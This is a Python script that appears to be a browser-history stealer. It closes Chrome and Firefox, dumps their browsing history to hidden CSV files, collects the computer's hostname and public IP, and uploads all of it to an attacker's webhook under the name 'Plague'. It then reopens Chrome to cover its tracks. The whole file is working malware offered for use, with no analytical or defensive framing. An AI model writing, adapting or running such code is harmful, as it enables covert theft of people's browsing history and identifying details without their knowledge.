import browserhistory as bh
import requests
import os
import socket
import subprocess

os.system("taskkill /im chrome.exe")
os.system('cls')
os.system("taskkill /im firefox.exe")
os.system('cls')

dict_obj = bh.get_browserhistory()
dict_obj.keys()

if os.path.exists("chrome_history.csv" or "firefox_history.csv"):
    os.remove("chrome_history.csv")
    os.remove("firefox_history.csv")
    bh.write_browserhistory_csv()
else:
    bh.write_browserhistory_csv()

subprocess.check_call(["attrib", "+H", "chrome_history.csv"])
subprocess.check_call(["attrib", "+H", "firefox_history.csv"])    

webhook = "webhook_here"

avatar = "https://i.ytimg.com/vi/_xatTdEOMX0/hqdefault.jpg"

g = requests.get("https://api.ipify.org/")

pcname = socket.gethostname()

payloads = {
    "username": "Plague",
    "avatar_url": avatar,
    "content": f"Search History for **{pcname}**\nIP: **{g.text}**",
}

requests.post(webhook, data=payloads)

os.system('cls')

if os.path.exists("chrome_history.csv"):
    files = {'files': open('chrome_history.csv', 'rb')}
    values = {
        'upload_file': 'chrome_history.csv',
        'DB': 'photcat',
        'OUT': 'csv',
        'SHORT': 'short',
        'content': f'',
        'username': 'Plague',
        'avatar_url': avatar,
    }
    requests.post(webhook, files=files, data=values)
else:
    errorchrome = {
        "content": "No Google Chrome History Was Found.",
        "username": "Plague",
        "avatar_url": avatar,
    }
    requests.post(webhook, data=errorchrome)

os.system('cls')

if os.path.exists("firefox_history.csv"):
    files2 = {'files': open('firefox_history.csv', 'rb')}
    values2 = {
        'upload_file': 'firefox_history.csv',
        'DB': 'photcat',
        'OUT': 'csv',
        'SHORT': 'short',
        'username': 'Plague',
        'avatar_url': avatar,
    }
    requests.post(webhook, files=files2, data=values2)
else:
    errorfirefox = {
        "content": "No Firefox History Was Found.",
        "username": "Plague",
        "avatar_url": avatar,
    }
    requests.post(webhook, data=errorfirefox)

os.system('cls')

if os.path.exists("safari_history.csv"):
    files2 = {'files': open('safari_history.csv', 'rb')}
    values2 = {
        'upload_file': 'safari_history.csv',
        'DB': 'photcat',
        'OUT': 'csv',
        'SHORT': 'short',
        'username': 'Plague',
        'avatar_url': avatar,
    }
    requests.post(webhook, files=files2, data=values2)
else:
    errorsafari = {
        "content": "No Safari History Was Found.",
        "username": "Plague",
        "avatar_url": avatar,
    }
    requests.post(webhook, data=errorsafari)

os.system('cls')

subprocess.call(
    ['C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe'])
